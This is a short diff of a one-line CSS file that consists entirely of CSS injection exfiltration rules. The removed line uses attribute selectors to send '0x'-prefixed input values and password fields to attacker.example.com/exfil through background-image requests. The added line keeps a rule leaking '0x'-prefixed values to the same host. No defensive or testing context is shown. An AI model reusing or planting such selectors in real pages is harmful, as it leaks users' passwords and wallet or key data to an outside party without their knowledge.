@@ -1,1 +1,1 @@
-input[value^="0x"]{background:url(https://attacker.example.com/exfil?prefix=0x)} input[type="password"]{background:url(https://attacker.example.com/exfil?field=password)}
+input[value^="0x"]{background:url(https://attacker.example.com/exfil?w=1)}
